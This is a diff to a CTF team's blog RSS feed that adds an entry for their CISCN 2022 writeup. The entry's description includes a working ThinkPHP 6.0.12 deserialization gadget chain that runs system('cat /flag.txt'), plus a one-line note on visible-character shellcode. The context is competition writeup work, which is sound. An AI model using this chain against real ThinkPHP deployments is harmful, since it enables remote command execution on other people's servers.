@@ -6,7 +6,17 @@
     <description>Recent content in Writeup on or4nge</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 18 Apr 2022 15:03:17 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 01 Jun 2022 17:17:17 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>CISCN2022 初赛 Writeup by or4nge</title>
+      <link>https://or4ngesec.github.io/post/ciscn-2022-writeup-by-or4nge/</link>
+      <pubDate>Wed, 01 Jun 2022 17:17:17 +0800</pubDate>
+      
+      <guid>https://or4ngesec.github.io/post/ciscn-2022-writeup-by-or4nge/</guid>
+      <description>Web ezpop tp6.0.12的反序列化洞，直接用现成的链的打就行
+&amp;lt;?php namespace think{ abstract class Model{ private $lazySave = false; private $data = []; private $exists = false; protected $table; private $withAttr = []; protected $json = []; protected $jsonAssoc = false; function __construct($obj = &amp;#39;&amp;#39;){ $this-&amp;gt;lazySave = True; $this-&amp;gt;data = [&amp;#39;key&amp;#39; =&amp;gt; [&amp;#34;cat /flag.txt&amp;#34;]]; $this-&amp;gt;exists = True; $this-&amp;gt;table = $obj; $this-&amp;gt;withAttr = [&amp;#39;key&amp;#39; =&amp;gt; [&amp;#39;system&amp;#39;]]; $this-&amp;gt;json = [&amp;#39;key&amp;#39;,[&amp;#39;key&amp;#39;]]; $this-&amp;gt;jsonAssoc = True; } } } namespace think\model{ use think\Model; class Pivot extends Model{ } } namespace{ echo(urlencode(serialize(new think\model\Pivot(new think\model\Pivot())))); } Pwn login-nomal 可见字符shellcode，调用ae64脚本，rdx直接打通</description>
+    </item>
+    
     <item>
       <title>starCTF2022 Writeup by or4nge</title>
       <link>https://or4ngesec.github.io/post/starctf2022-writeup-by-or4nge/</link>
